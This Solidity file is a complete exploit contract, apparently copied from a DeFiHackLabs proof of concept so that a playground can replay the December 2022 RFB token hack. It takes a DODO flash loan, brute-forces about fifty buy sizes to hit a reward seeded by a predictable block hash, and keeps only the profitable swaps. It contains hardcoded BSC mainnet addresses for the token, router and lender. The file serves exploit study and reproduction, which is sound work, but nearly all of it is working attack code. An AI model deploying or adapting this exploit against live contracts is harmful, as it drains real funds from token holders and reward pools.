// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-RFB).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// (the DODO flash-loan callback `DPPFlashLoanCall` lives on the test itself, so
// there is no standalone contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (testExploit + DPPFlashLoanCall +
// check + BNBToRFB + RFBToBNB + receive) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/RFB_exp.sol.
//
// Root cause: RFB's "lucky buyer" reward is gated by an on-chain predictable
// hash `keccak256(block.number, block.timestamp, buyer, _balances[pair])`, where
// `_balances[pair]` shifts deterministically with the buy size. So the attacker
// brute-forces ~50 candidate buy sizes, keeps only the seeds that hit the
// jackpot (paid in real ETH from the DividendDistributor pool), and reverts the
// loss-making round-trips via try/catch.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IUniswapV2Router {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract RFBDrain {
    IERC20 constant RFB = IERC20(0x26f1457f067bF26881F311833391b52cA871a4b5);
    IWBNB constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IUniswapV2Router constant Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;

    function run() external payable {
        RFB.approve(address(Router), type(uint256).max);
        WBNB.approve(address(Router), type(uint256).max);
        payable(address(uint160(0))).transfer(address(this).balance);
        IDVM(dodo).flashLoan(20 * 1e18, 0, address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        WBNB.withdraw(20 * 1e18);
        for (uint256 i = 0; i < 50; i++) {
            try this.check(20 * 1e18 - i) {}
            catch {
                continue;
            }
        }
        WBNB.deposit{value: address(this).balance}();
        WBNB.transfer(dodo, 20 * 1e18);
    }

    function check(uint256 amount) public payable {
        uint256 BNBBalance = address(this).balance;
        BNBToRFB(amount);
        RFBToBNB();
        require(address(this).balance - BNBBalance > 0);
    }

    function BNBToRFB(uint256 amount) public payable {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(RFB);
        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0, path, address(this), block.timestamp
        );
    }

    function RFBToBNB() public payable {
        address[] memory path = new address[](2);
        path[0] = address(RFB);
        path[1] = address(WBNB);
        Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            RFB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}
